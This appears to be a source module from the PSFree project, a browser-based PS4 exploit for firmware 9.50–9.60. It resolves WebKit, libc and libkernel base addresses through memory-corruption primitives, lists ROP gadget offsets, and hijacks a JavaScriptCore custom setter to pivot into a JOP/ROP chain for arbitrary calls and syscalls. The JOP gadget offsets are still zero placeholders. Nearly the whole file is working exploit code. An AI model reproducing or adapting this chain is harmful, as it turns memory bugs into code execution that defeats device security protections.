/* Copyright (C) 2023-2025 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// 9.50, 9.51, 9.60

import { mem } from '../../module/mem.mjs';
import { KB } from '../../module/offset.mjs';
import { ChainBase, get_gadget } from '../../module/chain.mjs';
import { BufferView } from '../../module/rw.mjs';

import {
    get_view_vector,
    resolve_import,
    init_syscall_array,
} from '../../module/memtools.mjs';

import * as off from '../../module/offset.mjs';

// WebKit offsets of imported functions
const offset_wk_stack_chk_fail = 0x178;
const offset_wk_strlen = 0x198;

// libSceNKWebKit.sprx
export let libwebkit_base = null;
// libkernel_web.sprx
export let libkernel_base = null;
// libSceLibcInternal.sprx
export let libc_base = null;

// TODO: gadgets for the JOP chain
//
// we'll use JSC::CustomGetterSetter.m_setter to redirect execution. its
// type is PutPropertySlot::PutValueFunc
const jop1 = `
mov rdi, qword ptr [rsi + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x70]
`;
// rbp is now pushed, any extra objects pushed by the call instructions can be
// ignored
const jop2 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x30]
`;
const jop3 = `
mov rdx, qword ptr [rdx + 0x50]
mov ecx, 0xa
call qword ptr [rax + 0x40]
`;
const jop4 = `
push rdx
mov edi, 0xac9784fe
jmp qword ptr [rax]
`;
const jop5 = 'pop rsp; ret';

// the ps4 firmware is compiled to use rbp as a frame pointer
//
// The JOP chain pushed rbp and moved rsp to rbp before the pivot. The chain
// must save rbp (rsp before the pivot) somewhere if it uses it. The chain must
// restore rbp (if needed) before the epilogue.
//
// The epilogue will move rbp to rsp (restore old rsp) and pop rbp (which we
// pushed earlier before the pivot, thus restoring the old rbp).
//
// leave instruction equivalent:
//     mov rsp, rbp
//     pop rbp

const webkit_gadget_offsets = new Map(Object.entries({
    'pop rax; ret' : 0x0000000000011c46, // `58 c3`
    'pop rbx; ret' : 0x0000000000013730, // `5b c3`
    'pop rcx; ret' : 0x0000000000035a1e, // `59 c3`
    'pop rdx; ret' : 0x000000000018de52, // `5a c3`

    'pop rbp; ret' : 0x00000000000000b6, // `5d c3`
    'pop rsi; ret' : 0x0000000000092a8c, // `5e c3`
    'pop rdi; ret' : 0x000000000005d19d, // `5f c3`
    'pop rsp; ret' : 0x00000000000253e0, // `5c c3`

    'pop r8; ret' : 0x000000000003fe32, // `47 58 c3`
    'pop r9; ret' : 0x0000000000aaad51, // `47 59 c3`
    // Not found in 9.50-9.60, but not currently used in exploit
    // 'pop r10; ret' : 0x0000000000000000, // `4(1,3,5,7,9,b,d,f) 5a c3`
    'pop r11; ret' : 0x0000000001833a21, // `47 5b c3`

    'pop r12; ret' : 0x0000000000420ad1, // `47 5c c3`
    'pop r13; ret' : 0x00000000018fc4c1, // `47 5d c3`
    'pop r14; ret' : 0x000000000028c900, // `41 5e c3`
    'pop r15; ret' : 0x0000000001437c8a, // `47 5f c3`

    'ret' : 0x0000000000000032, // `c3`
    'leave; ret' : 0x0000000000056322, // `c9 c3`

    'mov rax, qword ptr [rax]; ret' : 0x000000000000c671, // `48 8b 00 c3`
    'mov qword ptr [rdi], rax; ret' : 0x0000000000010c07, // `48 89 07 c3`
    'mov dword ptr [rdi], eax; ret' : 0x00000000000071d0, // `89 07 c3`
    'mov dword ptr [rax], esi; ret' : 0x000000000007ebd8, // `89 30 c3`

    [jop1] : 0x0000000000000000, // ``
    [jop2] : 0x0000000000000000, // ``
    [jop3] : 0x0000000000000000, // ``
    [jop4] : 0x0000000000000000, // ``
    [jop5] : 0x0000000000000000, // ``
}));

const libc_gadget_offsets = new Map(Object.entries({
    'getcontext' : 0x21284,
    'setcontext' : 0x254dc,
}));

const libkernel_gadget_offsets = new Map(Object.entries({
    // returns the location of errno
    '__error' : 0xbb60,
}));

export const gadgets = new Map();

function get_bases() {
    const textarea = document.createElement('textarea');
    const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
    const textarea_vtable = webcore_textarea.readp(0);
    const off_ta_vt = 0x2ebea68;
    const libwebkit_base = textarea_vtable.sub(off_ta_vt);

    const stack_chk_fail_import = libwebkit_base.add(offset_wk_stack_chk_fail);
    const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
    const off_scf = 0x28870;
    const libkernel_base = stack_chk_fail_addr.sub(off_scf);

    const strlen_import = libwebkit_base.add(offset_wk_strlen);
    const strlen_addr = resolve_import(strlen_import);
    const off_strlen = 0x4c040;
    const libc_base = strlen_addr.sub(off_strlen);

    return [
        libwebkit_base,
        libkernel_base,
        libc_base,
    ];
}

export function init_gadget_map(gadget_map, offset_map, base_addr) {
    for (const [insn, offset] of offset_map) {
        gadget_map.set(insn, base_addr.add(offset));
    }
}

class Chain950Base extends ChainBase {
    push_end() {
        this.push_gadget('leave; ret');
    }

    push_get_retval() {
        this.push_gadget('pop rdi; ret');
        this.push_value(this.retval_addr);
        this.push_gadget('mov qword ptr [rdi], rax; ret');
    }

    push_get_errno() {
        this.push_gadget('pop rdi; ret');
        this.push_value(this.errno_addr);

        this.push_call(this.get_gadget('__error'));

        this.push_gadget('mov rax, qword ptr [rax]; ret');
        this.push_gadget('mov dword ptr [rdi], eax; ret');
    }

    push_clear_errno() {
        this.push_call(this.get_gadget('__error'));
        this.push_gadget('pop rsi; ret');
        this.push_value(0);
        this.push_gadget('mov dword ptr [rax], esi; ret');
    }
}

export class Chain950 extends Chain950Base {
    constructor() {
        super();
        const [rdx, rdx_bak] = mem.gc_alloc(0x58);
        rdx.write64(off.js_cell, this._empty_cell);
        rdx.write64(0x50, this.stack_addr);
        this._rsp = mem.fakeobj(rdx);
    }

    run() {
        this.check_allow_run();
        this._rop.launch = this._rsp;
        this.dirty();
    }
}

export const Chain = Chain950;

export function init(Chain) {
    const syscall_array = [];
    [libwebkit_base, libkernel_base, libc_base] = get_bases();

    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
    init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
    init_syscall_array(syscall_array, libkernel_base, 300 * KB);

    let gs = Object.getOwnPropertyDescriptor(window, 'location').set;
    // JSCustomGetterSetter.m_getterSetter
    gs = mem.addrof(gs).readp(0x28);

    // sizeof JSC::CustomGetterSetter
    const size_cgs = 0x18;
    const [gc_buf, gc_back] = mem.gc_alloc(size_cgs);
    mem.cpy(gc_buf, gs, size_cgs);
    // JSC::CustomGetterSetter.m_setter
    gc_buf.write64(0x10, get_gadget(gadgets, jop1));

    const proto = Chain.prototype;
    // _rop must have a descriptor initially in order for the structure to pass
    // setHasReadOnlyOrGetterSetterPropertiesExcludingProto() thus forcing a
    // call to JSObject::putInlineSlow(). putInlineSlow() is the code path that
    // checks for any descriptor to run
    //
    // the butterfly's indexing type must be something the GC won't inspect
    // like DoubleShape. it will be used to store the JOP table's pointer
    const _rop = {get launch() {throw Error('never call')}, 0: 1.1};
    // replace .launch with the actual custom getter/setter
    mem.addrof(_rop).write64(off.js_inline_prop, gc_buf);
    proto._rop = _rop;

    // JOP table
    const rax_ptrs = new BufferView(0x100);
    const rax_ptrs_p = get_view_vector(rax_ptrs);
    proto._rax_ptrs = rax_ptrs;

    rax_ptrs.write64(0x70, get_gadget(gadgets, jop2));
    rax_ptrs.write64(0x30, get_gadget(gadgets, jop3));
    rax_ptrs.write64(0x40, get_gadget(gadgets, jop4));
    rax_ptrs.write64(0, get_gadget(gadgets, jop5));

    const jop_buffer_p = mem.addrof(_rop).readp(off.js_butterfly);
    jop_buffer_p.write64(0, rax_ptrs_p);

    const empty = {};
    proto._empty_cell = mem.addrof(empty).read64(off.js_cell);

    Chain.init_class(gadgets, syscall_array);
}
